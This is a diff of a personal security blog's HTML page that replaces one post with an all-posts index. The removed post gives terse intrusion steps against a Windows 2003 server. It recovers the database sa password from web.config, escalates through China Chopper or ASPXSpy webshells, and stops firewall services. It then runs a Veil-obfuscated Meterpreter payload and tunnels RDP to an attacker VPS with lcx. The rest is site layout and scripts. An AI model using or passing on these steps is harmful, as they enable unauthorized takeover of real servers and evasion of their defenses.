@@ -4,7 +4,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>windows 2003 r2 aspx</title>
+<title>quanyechavshuo</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="http://gmpg.org/xfn/11" />
@@ -100,132 +100,68 @@
 
     <div class="page-content">
       <div class="wrap">
+      <div class="container-fluid index">
+  <div class="row index all-posts">
+
+    <h1 class="header author-header"></h1>
+    <h2 class="header" itemprop="headline">All posts</h2>
+    <br>
+    <br>
+    <br>
+
+    
+    jekyll ---------->5<br>
+    
+    <a href="/jekyll/2016/04/09/github-jekyll-blog/">
+        Use github and jekyll start github pages</a> <small>2016-04-09</small><br>
+    
+    <a href="/jekyll/2015/03/23/welcome-to-carte-noir/">
+        Welcome to Carte Noire</a> <small>2015-03-23</small><br>
+    
+    <a href="/jekyll/2014/06/10/carte-noire-in-action/">
+        Carte Noire in Action</a> <small>2014-06-10</small><br>
+    
+    <a href="/jekyll/2014/06/09/so-what-is-jekyll/">
+        So, What is Jekyll?</a> <small>2014-06-09</small><br>
+    
+    <a href="/jekyll/2014/06/08/using-thumbnails/">
+        Using thumbnails</a> <small>2014-06-08</small><br>
+     
+    js ---------->1<br>
+    
+    <a href="/js/2016/03/07/%E4%B8%80%E9%81%93ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E7%9A%84web%E9%A2%98witeup/">
+        一道ctf训练营的web题writeup</a> <small>2016-03-07</small><br>
+     
+    python ---------->3<br>
+    
+    <a href="/python/2016/04/15/MyToolkit/">
+        MyToolKit</a> <small>2016-04-15</small><br>
+    
+    <a href="/python/2016/04/14/pyhton-cookie-post-%E5%88%B7%E7%A5%A8/">
+        Pyhton Cookie Post 刷票</a> <small>2016-04-14</small><br>
+    
+    <a href="/python/2016/03/07/%E5%AD%A6%E4%B9%A0urllib2+BeautifulSoup-%E7%88%AC%E4%B9%8C%E4%BA%91%E6%89%80%E6%9C%89%E5%8E%82%E5%95%86url%E5%88%97%E8%A1%A8/">
+        学习urllib2+BeautifulSoup：爬乌云所有厂商url列表</a> <small>2016-03-07</small><br>
+     
+    web ---------->3<br>
+    
+    <a href="/web/2016/04/12/phpmyadmin%E7%8B%AC%E5%AE%B6%E6%8A%80%E8%83%BD/">
+        phpmyadmin独家技能</a> <small>2016-04-12</small><br>
+    
+    <a href="/web/2016/04/10/windows-2003-inside-network-aspx/">
+        Inside network in workgroup</a> <small>2016-04-10</small><br>
+    
+    <a href="/web/2016/04/09/windows-2003-r2-aspx/">
+        windows 2003 r2 aspx</a> <small>2016-04-09</small><br>
+     
+    notes ---------->1<br>
+    
+    <a href="/notes/2016/04/15/My-notes/">
+        My notes</a> <small>2016-04-15</small><br>
       
-
-<div class="container-fluid single">
-  <div class="row">
-
-    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
-      
-      <div class="thumb">
-        <i class="fa fa-heart fa-4x"></i>
-      </div>
-      
-
-      <h1 class="header" itemprop="name">windows 2003 r2 aspx</h1>
-
-      <div class="author">
-        <small><i>
-          
-          by
-          <span itemprop="author">
-            
-            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
-              <span itemprop="name">quanyechavshuo</span>
-            </span>
-            
-          </span>
-          
-          on <span itemprop="datePublished" content="2014-08-28">April 9, 2016</span>
-           under web
-        </i></small>
-      </div>
-
-      <div class="read-time">
-        <small>
-          1 minute read
-        </small>
-      </div>
-
-      <div class="content-panel content">
-
-        
-
-        <span itemprop="articleBody"><h3 id="search-webconfig-to-find-sa-and-sa-password">1&gt;search web.config———&gt; to find sa and sa password</h3>
-
-<h3 id="choppperor-aspxspyto-connect-dbget-sa-privilege">2&gt;choppper(or aspxspy)to connect db,get sa privilege</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>sometimes strong webshell (like aspxspy.aspx) cannot get system privilege with sa and pass,try:
-1.use sa execute cmd in chopper
-or
-2.restart the system and try strong webshell like aspxspy.aspx
-</code></pre>
-</div>
-
-<h3 id="net-stop-sharedaccess">3&gt;net stop sharedaccess</h3>
-
-<h3 id="net-stop-policyagent">4&gt;net stop policyagent</h3>
-
-<h3 id="use-sa-pri-run-meterpreteruse-veil-to-jail-payload">5&gt;use sa pri run meterpreter(use veil to jail) payload</h3>
-
-<h3 id="use-meterpreter-shell-to-open-vnc-or-desktop">6&gt;use meterpreter shell to open vnc or desktop</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter&gt;run vnc
-or
-meterpreter&gt;background
-msf&gt;use post/windows/manage/enable_rdp
-</code></pre>
-</div>
-
-<h3 id="if-6-failuse-sa-privilegesin-chopperto-run">7&gt;if 6 fail,use sa privileges(in chopper)to run:</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>victim:lcx -slave vps_ip vps_port victim_ip 3389
-vps:lcx -listen vps_port 1234
-vps:mstsc /console /v:127.0.0.1:1234  
-
-Notice:normally,mstsc----&gt;127.0.0.1:1234 is ok,sometimes exists connect num restrict,use it.in win7: need runas admin,and use:mstsc /console /v:127.0.0.1:1234 -admin
-</code></pre>
-</div>
-</span>
-
-        
-
-
-        
-        <div class="tags">
-          <small>
-          <i class="fa fa-tags"></i>
-            windows, aspx
-          </small>
-        </div>
-        
-
-      </div>
-
-      
-      <div class="content-panel feedback">
-        I <i class="fa fa-heart"></i> feedback.<br />
-        Let me know what you think of this article on twitter <a href="http://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
-      </div>
-      
-
-      
-      <div class="content-panel comments">
-        <div id="disqus_thread">
-          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-      </div>
-      
-
-      
-
-    </div>
-
   </div>
 
 </div>
-
-
-<script type="text/javascript">
-/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-function disqus_config() { this.experiment.enable_scroll_container = true; }
-var disqus_shortname = "cartenoire"; // required: replace example with your forum shortname
-/* * * DON'T EDIT BELOW THIS LINE * * */
-(function() {
-  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-})();
-</script>
-
 
       </div>
     </div>
@@ -260,6 +196,48 @@ var disqus_shortname = "cartenoire"; // required: replace example with your foru
    });
 </script>
 
+
+<script type="text/javascript">
+
+  function setFontSize() {
+
+    var title, dateOfTitle, fontSizeOfTitle, listOfA, listOfSmall, listOfArticlesDiv, divWidth;
+
+    listOfArticlesDiv = document.getElementsByClassName("articles");
+
+    for (i = 0; i < listOfArticlesDiv.length; i++) {
+
+      listOfA = document.getElementsByClassName("articles")[i].getElementsByTagName("a");
+      listOfSmall = document.getElementsByClassName("articles")[i].getElementsByTagName("small");
+
+      divWidth = document.getElementsByClassName("articles")[i].offsetWidth;
+
+      for (k = 0; k < listOfSmall.length; k++) {
+
+        title = $(listOfA[k]);
+        dateOfTitle = $(listOfSmall[k]);
+
+        fontSizeOfTitle = startingFontSize;
+        title.css("font-size", fontSizeOfTitle);
+
+        while (title.width() + dateOfTitle.width() >= divWidth)
+          title.css("font-size", fontSizeOfTitle -= 0.5);
+
+      }
+    }
+  }
+
+  function getStartFontSize() {
+    try {
+      startingFontSize = parseInt($(document.getElementsByClassName("articles")[0].getElementsByTagName("a")[0]).css("font-size"));
+      setFontSize();
+      window.addEventListener('resize', setFontSize, true);
+    } catch (e) {}
+  }
+
+  $(document).ready(getStartFontSize);
+
+</script>
 
 
 
